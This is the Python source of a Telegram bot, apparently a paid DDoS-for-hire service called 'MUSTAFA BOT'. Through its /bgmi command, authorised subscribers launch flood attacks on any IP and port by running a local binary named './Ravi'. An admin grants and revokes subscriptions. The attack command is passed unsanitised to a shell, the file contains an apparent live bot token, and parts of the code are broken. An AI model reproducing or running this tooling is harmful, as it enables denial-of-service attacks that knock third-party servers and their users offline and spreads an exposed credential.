import time
import subprocess
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackContext

import os
BOT_TOKEN = os.getenv("7432153187:AAHhVYbK5PCkEHN7TELau_VC9KktKOvPT9I")
ADMIN_ID = 8179218740  

AUTHORIZED_USERS = {}

def execute_binary(ip, port, attack_time):
    command = f"./Ravi {ip} {port} {attack_time} 900"
    try:
        subprocess.run(command, shell=True, check=True)
        print("✅ Binary executed successfully!")
    except subprocess.CalledProcessError as e:
        print(f"❌ Error executing binary: {e}")

def start(update: Update, context: CallbackContext) -> None:
    user = update.message.from_user
    username = user.first_name  
    user_id = user.id

    welcome_message = (
        f"👋🏻 WELCOME, {username} 💀! 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 THIS IS MUSTAFA BOT!\n"
        "🚀 Enjoy high-speed attacks!"
    )

    keyboard = [
        [InlineKeyboardButton("🚀 CLICK HERE TO JOIN 🚀", url="https://t.me/MUSTAFALEAKS2")],
        [InlineKeyboardButton("👑 BOT CREATED BY 👑", url="https://t.me/SIDIKI_MUSTAFA_47")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    update.message.reply_text(welcome_message, reply_markup=reply_markup)

def help_command(update: Update, context: CallbackContext) -> None:
    help_text = (
        "💬 **Available Commands:**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 `/start` - Start the bot\n"
        "📌 `/help` - Show this help message\n"
        "📌 `/status` - Check your subscription status\n"
        "📌 `/bgmi <ip> <port> <time>` - Launch an attack\n"
        "📌 `/add <user_id> <duration> <unit>` - Add user (Admin only)\n"
        "📌 `/remove <user_id>` - Remove user (Admin only)\n"
        "📌 `/users` - List all authorized users (Admin only)"
    )
    update.message.reply_text(help_text)

def status(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    username = update.message.from_user.first_name

    if user_id in AUTHORIZED_USERS:
        expiry_time = AUTHORIZED_USERS[user_id]
        time_left = expiry_time - datetime.now()
        update.message.reply_text(f"👤 **User:** {username}\n🆔 **ID:** {user_id}\n💎 **Subscription:** ✅ ACTIVE\n⏳ **Time Left:** {time_left}")
    else:
        update.message.reply_text(f"👤 **User:** {username}\n🆔 **ID:** {user_id}\n💎 **Subscription:** ❌ INACTIVE")

def bgmi(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ **You are not authorized to use this command!**")
        return

    if len(context.args) < 3:
        update.message.reply_text("📌 **Usage:** `/bgmi <ip> <port> <time>`")
        return

    ip, port, attack_time = context.args[:3]

    attack_message = (
        "🚀 **ＡＴＴＡＣＫ ＩＮＩＴＩＡＴＥＤ!** 🚀\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **ＴＡＲＧＥＴ:** `{ip}`\n"
        f"📡 **ＰＯＲＴ:** `{port}`\n"
        f"⏳ **ＤＵＲＡＴＩＯＮ:** `{attack_time} SEC`\n"
        "💥 **ＳＴＡＴＵＳ:** **🔥 𝐋𝐀𝐔𝐍𝐂𝐇𝐈𝐍𝐆 𝐍𝐎𝐖! 🔥**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "⚡ **ＳＴＡ𝐘 Ｃ𝐎ＮＮ𝐄Ｃ𝐓𝐄Ｄ 𝐅𝐎𝐑 𝐔𝐏𝐃𝐀𝐓𝐄𝐒!"
    )

    update.message.reply_text(attack_message)

    execute_binary(ip, port, attack_time)

    update.message.reply_text("✅ **Attack Completed!**")

def add_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        update.message.reply_text("❌ **Only Admin can add users!**")
        return

    if len(context.args) < 3:
        update.message.reply_text("❌ **Usage:** /add `<user_id>` `<duration>` `<unit>`")
        return

    try:
        user_id = int(context.args[0])
        duration = int(context.args[1])
        unit = context.args[2].lower()

        if unit == "minutes":
            expiry_time = datetime.now() + timedelta(minutes=duration)
        elif unit == "hours":
            expiry_time = datetime.now() + timedelta(hours=duration)
        elif unit == "days":
            expiry_time = datetime.now() + timedelta(days=duration)
        elif unit == "weeks":
            expiry_time = datetime.now() + timedelta(weeks=duration)
        elif unit == "months":
            expiry_time = datetime.now() + timedelta(days=duration * 30)
        else:
            update.message.reply_text("❌ **Invalid unit! Use `minutes`, `hours`, `days`, `weeks`, or `months`.**")
            return

        AUTHORIZED_USERS[user_id] = expiry_time
        update.message.reply_text(f"✅ **User {user_id} added for {duration} {unit}!**")

    except ValueError:
        update.message.reply_text("❌ **Invalid input! Use numbers only.**")

def remove_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        update.message.reply_text("❌ **You are not authorized to remove users!**")
        return

    if len(context.args) < 1:
        update.message.reply_text("❌ **Usage:** /remove `<user_id>`")
        return

    try:
        user_id = int(context.args[0])
        if user_id in AUTHORIZED_USERS:
            del AUTHORIZED_USERS[user_id]
            update.message.reply_text(f"✅ **User {user_id} removed!**")
        else:
            update.message.reply_text("❌ **User not found!**")
    except ValueError:
        update.message.reply_text("❌ **Invalid input! Use numbers only.**")

def list_users(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        update.message.reply_text("❌ **You are not authorized to view users!**")
        return

    if not AUTHORIZED_USERS:
        update.message.reply_text("📌 **No authorized users found!**")
        return

    user_list = "\n".join([f"👤 **User ID:** `{user_id}` - ⏳ Expires: {expiry_time}" for user_id, expiry_time in AUTHORIZED_USERS.items()])
    update.message.reply_text(f"📋 **Authorized Users:**\n\n{user_list}")

# 🔥 Bot Initialization
def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))

    application.run_polling()

if __name__ == '__main__':
    main()
